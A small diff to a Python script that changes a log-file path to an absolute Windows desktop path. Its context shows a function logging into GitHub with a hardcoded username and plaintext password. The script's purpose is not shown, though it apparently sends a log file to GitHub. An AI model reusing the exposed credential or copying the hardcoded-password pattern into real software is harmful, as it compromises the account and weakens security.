@@ -5,7 +5,7 @@ import os
 
 path = "others/"
 filePath = "Tapalog.log"#base64.b64encode("Tapalog.log")
-TargetOSfilePath = "Tapalog.log"
+TargetOSfilePath = "C:\\Users\\this-PC\\Desktop\\work\\Tapalog.log"
 
 def connect_to_github():
 	gh = login(username="MarvenGarsalli",password="1'mfor1am")
